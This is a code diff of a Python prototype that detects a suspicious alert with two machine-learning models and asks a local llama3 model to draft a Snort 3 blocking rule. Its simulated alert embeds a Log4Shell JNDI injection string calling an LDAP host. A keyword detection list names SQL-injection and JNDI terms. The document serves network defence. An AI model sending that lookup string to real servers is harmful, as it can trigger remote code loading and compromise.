@@ -9,63 +9,66 @@ def engineer_features_for_single_alert(alert_info):
     that was done on the training data.
     """
     message = alert_info['message']
-
-    # Create a DataFrame for the new alert
+    
     df = pd.DataFrame([{
         'message': message,
         'dest_port': int(alert_info['dest_port'])
     }])
-
-    # 1. Message Length
+    
     df['message_length'] = df['message'].str.len()
-
-    # 2. Special Character Count
-    special_chars = r'[\$\{\}\(\)\'\/]' # Added \/ to count slashes
+    special_chars = r'[\$\{\}\(\)\'\/]'
     df['special_char_count'] = df['message'].str.count(special_chars)
-
-    # 3. Malicious Keyword Count (case-insensitive)
     keywords = ['select', 'union', 'script', 'jndi', 'ldap', 'payload']
-    keyword_pattern = '|'.join(keywords) # No leading | needed here
+    keyword_pattern = '|'.join(keywords)
     df['keyword_count'] = df['message'].str.lower().str.count(keyword_pattern)
-
-    # Return the DataFrame ready for prediction (ensure column order matches training)
+    
     return df[['dest_port', 'message_length', 'special_char_count', 'keyword_count', 'message']]
 
 
 def generate_snort_rule_prompt(alert_info):
     """
-    Constructs a detailed prompt for Ollama to generate a Snort rule.
+    Constructs a stricter prompt for Ollama to generate a Snort rule.
+    Includes explicit DO and DO NOT examples.
     """
+    src_ip = alert_info['source_ip']
+    dst_port = alert_info['dest_port']
+    
     prompt = f"""
-    As a senior cybersecurity analyst, you have been tasked with writing a Snort 3 rule.
-    A new, suspicious network event has been detected with the following details:
+    You are a Snort 3 expert. Write a strict Snort 3 rule to block the following threat.
+    
+    THREAT DETAILS:
+    - Source IP: {src_ip}
+    - Destination Port: {dst_port}
+    - Payload: "{alert_info['message']}"
 
-    - **Alert Message**: "{alert_info['message']}"
-    - **Source IP**: {alert_info['source_ip']}
-    - **Destination Port**: {alert_info['dest_port']}
-    - **Protocol**: {alert_info['protocol']}
+    STRICT FORMATTING RULES:
+    1. Use the standard header format: alert tcp <SRC_IP> any -> any <DST_PORT>
+    2. Do NOT use words like "src ip" or "dst port" in the header.
+    3. Do NOT include markdown code fences (```).
+    4. Ensure the rule options are enclosed in parentheses.
 
-    Based on this information, generate a Snort 3 rule that will block future attempts from this specific source IP and also try to match the content of the suspicious message.
-    The rule should be in the correct Snort 3 syntax. For example:
-    `alert tcp any any -> $HOME_NET 80 (msg:"..."; content:"..."; sid:1000005; rev:1;)`
+    CORRECT EXAMPLE (Follow this structure):
+    alert tcp {src_ip} any -> any {dst_port} (msg:"Detected Malicious Payload"; content:"payload"; sid:1000020; rev:1;)
 
-    Provide only the Snort rule as your response, without any introductory text or code fences like ```.
+    INCORRECT EXAMPLE (Never do this):
+    alert tcp src ip {src_ip} dst port {dst_port} ...
+
+    OUTPUT:
+    Provide ONLY the valid Snort rule line. Nothing else.
     """
-    # Added clarification to the prompt to avoid code fences
     return prompt
 
 # --- Main Execution ---
 if __name__ == "__main__":
-    # 1. Load the pre-trained models
+    # 1. Load models
     try:
         classifier_pipeline = joblib.load('random_forest_pipeline.joblib')
         anomaly_pipeline = joblib.load('isolation_forest_pipeline.joblib')
     except FileNotFoundError as e:
-        print(f"Error: Could not find a required model file: {e.filename}")
-        print("Please run the 'train_model.py' script first to create both model files.")
+        print(f"Error: Could not find model file: {e.filename}")
         exit()
 
-    # 2. Simulate a new, unseen, suspicious alert (Log4j)
+    # 2. Simulate Alert
     new_alert_info = {
         'message': 'GET /?payload=${jndi:ldap://192.168.1.6:1389/a} HTTP/1.1',
         'source_ip': '192.168.1.6',
@@ -73,70 +76,48 @@ if __name__ == "__main__":
         'protocol': 'tcp'
     }
 
-    # 3. Engineer features for the new alert
+    # 3. Predict
     new_alert_df = engineer_features_for_single_alert(new_alert_info)
-
-    # 4. Get predictions from BOTH models
-    try:
-        classifier_prediction = classifier_pipeline.predict(new_alert_df)
-        # IsolationForest prediction: 1 for inlier (normal), -1 for outlier (anomaly)
-        anomaly_prediction = anomaly_pipeline.predict(new_alert_df)
-    except Exception as e:
-        print(f"Error during model prediction: {e}")
-        print("This might indicate an issue with the saved model files or input data format.")
-        exit()
-
+    classifier_prediction = classifier_pipeline.predict(new_alert_df)
+    anomaly_prediction = anomaly_pipeline.predict(new_alert_df)
 
     print("--- Hybrid Model Analysis ---")
-    print(f"Alert: '{new_alert_info['message']}'")
-    print(f"Classifier (Random Forest) Prediction: {'MALICIOUS' if classifier_prediction[0] == 1 else 'Benign'}")
-    print(f"Anomaly Detector (Isolation Forest) Prediction: {'ANOMALY' if anomaly_prediction[0] == -1 else 'Normal'}")
+    print(f"Classifier Prediction: {'MALICIOUS' if classifier_prediction[0] == 1 else 'Benign'}")
+    print(f"Anomaly Prediction:    {'ANOMALY' if anomaly_prediction[0] == -1 else 'Normal'}")
     print("-----------------------------")
 
-    # 5. Hybrid Decision Logic: Is it malicious OR is it an anomaly?
     if classifier_prediction[0] == 1 or anomaly_prediction[0] == -1:
-        print("\nSUCCESS: The hybrid system flagged the new threat as MALICIOUS.")
-
-        # Determine which model triggered the alert for the report
-        trigger_reasons = []
-        if classifier_prediction[0] == 1:
-            trigger_reasons.append("Classifier identified a known pattern.")
-        if anomaly_prediction[0] == -1:
-            trigger_reasons.append("Anomaly detector identified a deviation from normal.")
-        print(f"Reason(s): {', '.join(trigger_reasons)}")
-
-
-        print("\nAsking Ollama to generate a new Snort rule...")
+        print("\nSUCCESS: Threat detected.")
+        print("Asking Ollama to generate a valid Snort rule...")
+        
         prompt = generate_snort_rule_prompt(new_alert_info)
-
+        
         try:
             response = ollama.chat(
                 model='llama3',
                 messages=[{'role': 'user', 'content': prompt}],
                 stream=False
             )
+            
+            rule = response['message']['content']
+            
+            # --- Post-Processing / Cleaning ---
+            rule = rule.replace('```', '').replace('snort', '').strip()
+            # Remove common LLM hallucinations if they appear
+            rule = rule.replace('src ip', '').replace('dst port', '') 
+            # Fix double spaces caused by removal
+            rule = re.sub(' +', ' ', rule)
+            
+            print("\n--- Suggested Rule ---")
+            print(rule)
+            print("----------------------")
 
-            suggested_rule = response['message']['content']
-
-            # --- FIX: Clean the rule before saving ---
-            suggested_rule = suggested_rule.replace('```', '') # Remove code fences
-            suggested_rule = suggested_rule.strip()          # Remove extra whitespace/newlines
-            # ----------------------------------------
-
-            print("\n--- Ollama's Suggested Snort Rule ---")
-            print(suggested_rule)
-            print("---------------------------------------")
-
-            # Save the CLEANED rule
-            with open("suggested_rules.txt", "a") as f:
-                f.write(f"# Rule for alert: {new_alert_info['message']}\n")
-                f.write(suggested_rule + "\n\n") # Append the cleaned rule
-            print("Cleaned rule saved to suggested_rules.txt for analyst review.")
+            with open("suggested_rules.txt", "w") as f: # Overwrite to keep it clean for the demo
+                f.write(f"# Rule for Log4j\n")
+                f.write(rule + "\n")
+            print("Rule saved to suggested_rules.txt")
 
         except Exception as e:
             print(f"\nError communicating with Ollama: {e}")
-            print("Please ensure the Ollama service is running and you have the 'llama3' model.")
-
     else:
-        print("\nINFO: The hybrid system classified the new threat as BENIGN.")
-        print("(Classifier predicted Benign AND Anomaly Detector predicted Normal)")
+        print("\nSystem classified threat as Benign.")
